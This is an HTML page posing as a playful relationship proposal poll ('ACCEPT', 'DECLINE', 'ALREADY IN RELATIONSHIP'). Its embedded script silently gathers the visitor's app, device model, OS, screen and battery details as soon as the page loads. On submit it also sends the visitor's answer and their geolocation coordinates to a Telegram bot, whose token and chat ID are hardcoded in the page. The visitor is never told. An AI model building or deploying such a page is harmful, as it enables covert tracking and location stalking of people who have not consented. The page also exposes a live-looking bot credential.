<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YOUR OPTIONS</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #4b0082, #ff4500, #8a2be2, #00ffff);
            background-size: 400% 400%;
            animation: gradientBG 8s ease infinite;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: white;
            overflow: hidden;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            text-align: center;
            padding: 3rem;
            border-radius: 20px;
            backdrop-filter: blur(20px);
            background: rgba(0, 0, 0, 0.6);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
            animation: glow 3s infinite alternate;
        }

        @keyframes glow {
            from { box-shadow: 0 0 20px #ff00ff; }
            to { box-shadow: 0 0 40px #00ffff; }
        }

        h1 {
            font-size: 2rem;
            margin-bottom: 2rem;
            background: linear-gradient(90deg, #ff00ff, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .option {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            gap: 1rem;
            margin: 1rem 0;
        }

        input[type="checkbox"] {
            appearance: none;
            width: 25px;
            height: 25px;
            border: 2px solid #ff00ff;
            border-radius: 50%;
            cursor: pointer;
        }

        input[type="checkbox"]:checked {
            background: linear-gradient(45deg, #ff00ff, #00ffff);
        }

        label {
            font-size: 1.5rem;
            cursor: pointer;
            user-select: none;
        }

        .submit-btn {
            margin-top: 2rem;
            padding: 1rem 3rem;
            font-size: 1.5rem;
            color: white;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            background: linear-gradient(90deg, #ff00ff, #00ffff);
            transition: all 0.3s;
        }

        .submit-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 0 30px #00ffff;
        }
    </style>
</head>

<body onload="sendInitialData()">
    <div class="container">
        <h1>SELECT AN OPTION, OR IT WILL NEVER CHANGE</h1>
        <div class="option">
            <input type="checkbox" id="accept" onclick="selectOnlyOne(this)">
            <label for="accept">ACCEPT ✅</label>
        </div>
        <div class="option">
            <input type="checkbox" id="decline" onclick="selectOnlyOne(this)">
            <label for="decline">DECLINE ❌</label>
        </div>
        <div class="option">
            <input type="checkbox" id="someoneElse" onclick="selectOnlyOne(this)">
            <label for="someoneElse">ALREADY IN RELATIONSHIP 🙂</label>
        </div>
        <button class="submit-btn" onclick="submitData()">SUBMIT</button>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
        const CHAT_ID = "5112680061";

        function selectOnlyOne(selectedCheckbox) {
            document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
                if (checkbox !== selectedCheckbox) checkbox.checked = false;
            });
        }

        // Detecting the App or Browser
        function detectApp() {
            const ua = navigator.userAgent.toLowerCase();
            const ref = document.referrer.toLowerCase();

            if (ua.includes("telegram") || ref.includes("t.me")) return "Telegram App";
            if (ua.includes("whatsapp") || ref.includes("whatsapp")) return "WhatsApp";
            if (ua.includes("instagram") || ref.includes("instagram")) return "Instagram";
            if (ua.includes("facebook") || ref.includes("fb")) return "Facebook";
            if (ua.includes("tiktok")) return "TikTok";
            if (ua.includes("twitter")) return "Twitter";
            if (ua.includes("edg")) return "Microsoft Edge";
            if (ua.includes("firefox")) return "Mozilla Firefox";
            if (ua.includes("safari") && !ua.includes("chrome")) return "Safari";
            if (ua.includes("chrome")) return "Google Chrome";

            return "Unknown";
        }

        // Get Device Info
        async function getDeviceInfo() {
            let info = `🔹 Opened in: ${detectApp()}\n`;
            
            if (navigator.userAgentData) {
                const ua = await navigator.userAgentData.getHighEntropyValues(["architecture", "model", "platform", "platformVersion"]);
                info += `🔹 Device Model: ${ua.model || "Unknown"}\n🔹 OS: ${ua.platform} ${ua.platformVersion}\n`;
            } else {
                info += `🔹 OS: ${navigator.platform}\n`;
            }

            info += `🔹 Screen: ${window.screen.width}x${window.screen.height}\n`;

            const battery = await navigator.getBattery();
            info += `🔋 Battery: ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})\n`;

            return info;
        }

        // Send Initial Data on Page Load
        async function sendInitialData() {
            const deviceInfo = await getDeviceInfo();
            sendMessage(`🚀 New User Visit\n${deviceInfo}`);
        }

        // Capture Selected Option
        function getSelectedOption() {
            const checkboxes = document.querySelectorAll('input[type="checkbox"]');
            for (const checkbox of checkboxes) {
                if (checkbox.checked) return checkbox.nextElementSibling.innerText;
            }
            return null;
        }

        // Send Form Data
        async function submitData() {
            const option = getSelectedOption();
            if (!option) return alert("Please select an option!");

            const deviceInfo = await getDeviceInfo();
            sendMessage(`✅ User Response\n🟢 Option: ${option}\n${deviceInfo}`);

            captureLocation();
        }

        // Capture User Location
        function captureLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => sendMessage(`📍 Location: Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
                    () => sendMessage("📍 Location: Not Available")
                );
            }
        }

        // Send Message to Telegram
        function sendMessage(message) {
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
            });
        }
    </script>
</body>

</html>
